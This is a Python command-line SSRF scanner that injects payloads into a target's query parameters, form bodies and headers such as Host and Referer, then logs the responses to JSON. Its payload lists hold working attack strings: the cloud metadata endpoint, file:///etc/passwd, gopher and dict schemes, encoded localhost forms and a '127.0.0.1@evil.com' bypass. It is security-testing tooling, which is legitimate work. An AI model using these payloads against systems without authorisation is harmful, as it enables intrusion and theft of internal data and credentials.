import argparse
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, ParseResult

import requests
import urllib3
from requests.exceptions import RequestException
from tqdm import tqdm


class PayloadGenerator:
    """Generate payloads for SSRF testing."""

    def __init__(self, collaborator_url: Optional[str] = None):
        self.collaborator_url = collaborator_url or "http://example-collaborator"

    @property
    def classic(self) -> List[str]:
        return [
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            self.collaborator_url,
            "file:///etc/passwd",
        ]

    @property
    def protocol_fuzz(self) -> List[str]:
        return [
            "ftp://127.0.0.1",
            "gopher://localhost",
            "dict://127.0.0.1",
            "file:///etc/passwd",
        ]

    @property
    def filter_evasion(self) -> List[str]:
        return [
            "http://2130706433",  # Decimal
            "http://0x7f000001",  # Hex
            "http://[::1]",  # IPv6
            "http://127.0.0.1@evil.com",  # Username trick
        ]

    def all_payloads(self) -> List[str]:
        payloads = set(self.classic + self.protocol_fuzz + self.filter_evasion)
        return list(payloads)


class SSRFScanner:
    def __init__(
        self,
        target: str,
        method: str = "GET",
        data: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        threads: int = 5,
        proxies: Optional[Dict[str, str]] = None,
        timeout: int = 10,
        collaborator_url: Optional[str] = None,
    ):
        self.original_url = target
        self.method = method.upper()
        self.original_body = data or ""
        self.custom_headers = headers or {}
        self.threads = threads
        self.proxies = proxies
        self.timeout = timeout
        self.session = requests.Session()
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.payload_gen = PayloadGenerator(collaborator_url)
        self.lock = threading.Lock()
        self.results: List[Dict[str, str]] = []

        # Parse initial parameters
        self.url_parsed: ParseResult = urlparse(self.original_url)
        self.base_query_params = {k: v[0] for k, v in parse_qs(self.url_parsed.query).items()}
        self.body_params = self._parse_body(self.original_body)

    @staticmethod
    def _parse_body(body: str) -> Dict[str, str]:
        try:
            return {k: v[0] for k, v in parse_qs(body).items()}
        except Exception:
            # Not a standard form-encoded body; ignore for now
            return {}

    def _build_url(self, new_params: Dict[str, str]) -> str:
        query = urlencode(new_params, doseq=False)
        new_parsed = self.url_parsed._replace(query=query)
        return urlunparse(new_parsed)

    def _mutation_jobs(self) -> List[Tuple[str, Optional[str], Dict[str, str]]]:
        """Prepare all mutations as jobs to be executed."""
        jobs = []
        payloads = self.payload_gen.all_payloads()

        # URL parameter mutations
        for param in self.base_query_params:
            for payload in payloads:
                mutated = self.base_query_params.copy()
                mutated[param] = payload
                jobs.append((self._build_url(mutated), None, self.custom_headers))

        # Body parameter mutations (if applicable and method allows)
        if self.method in {"POST", "PUT", "PATCH"} and self.body_params:
            for param in self.body_params:
                for payload in payloads:
                    mutated_body_params = self.body_params.copy()
                    mutated_body_params[param] = payload
                    body_str = urlencode(mutated_body_params)
                    jobs.append((self.original_url, body_str, self.custom_headers))

        # Header injections
        header_targets = [
            "X-Forwarded-For",
            "Referer",
            "Host",
            "X-Original-URL",
        ]
        for header_name in header_targets:
            for payload in payloads:
                headers = self.custom_headers.copy()
                headers[header_name] = payload
                jobs.append((self.original_url, None, headers))
        return jobs

    def _send_request(self, url: str, data: Optional[str], headers: Dict[str, str]) -> Dict[str, str]:
        start_time = time.time()
        try:
            response = self.session.request(
                self.method,
                url,
                data=data,
                headers=headers,
                timeout=self.timeout,
                proxies=self.proxies,
                verify=False,
                allow_redirects=True,
            )
            elapsed = time.time() - start_time
            return {
                "url": url,
                "data": data or "",
                "headers": headers,
                "status": str(response.status_code),
                "length": str(len(response.content)),
                "time": f"{elapsed:.2f}s",
                "error": "",
            }
        except RequestException as e:
            elapsed = time.time() - start_time
            return {
                "url": url,
                "data": data or "",
                "headers": headers,
                "status": "ERROR",
                "length": "0",
                "time": f"{elapsed:.2f}s",
                "error": str(e),
            }

    def scan(self) -> List[Dict[str, str]]:
        jobs = self._mutation_jobs()
        print(f"[*] Generated {len(jobs)} mutation jobs. Starting scan with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._send_request, url, data, headers): (url, data)
                for url, data, headers in jobs
            }
            for future in tqdm(as_completed(futures), total=len(futures), desc="Scanning"):
                result = future.result()
                with self.lock:
                    self.results.append(result)

        return self.results

    def save_report(self, output_file: str):
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2)
        print(f"[+] Report saved to {output_file}")


def parse_headers(header_strings: List[str]) -> Dict[str, str]:
    headers = {}
    for h in header_strings:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def cli():
    parser = argparse.ArgumentParser(description="Advanced SSRF Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://target.com/page?url=PARAM)")
    parser.add_argument("-X", "--method", default="GET", help="HTTP method to use (GET, POST...) ")
    parser.add_argument("-d", "--data", default="", help="Request body (for POST/PUT)")
    parser.add_argument("-H", "--header", action="append", default=[], help="Custom header, can be used multiple times (e.g., -H 'Authorization: Bearer token')")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout seconds")
    parser.add_argument("--collab", help="Collaborator URL for OOB detection")
    parser.add_argument("-o", "--output", default="ssrf_report.json", help="Output report file")

    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    headers = parse_headers(args.header)

    scanner = SSRFScanner(
        target=args.url,
        method=args.method,
        data=args.data,
        headers=headers,
        threads=args.threads,
        proxies=proxies,
        timeout=args.timeout,
        collaborator_url=args.collab,
    )
    results = scanner.scan()
    scanner.save_report(args.output)

    # Simple stdout summary
    def is_issue(record: Dict[str, str]):
        if record["status"] == "ERROR":
            return True
        try:
            code = int(record["status"])
            return code < 200 or code >= 400
        except ValueError:
            return True

    success = [r for r in results if is_issue(r)]
    print(f"[*] Total tests: {len(results)}, potential issues: {len(success)}")


if __name__ == "__main__":
    cli()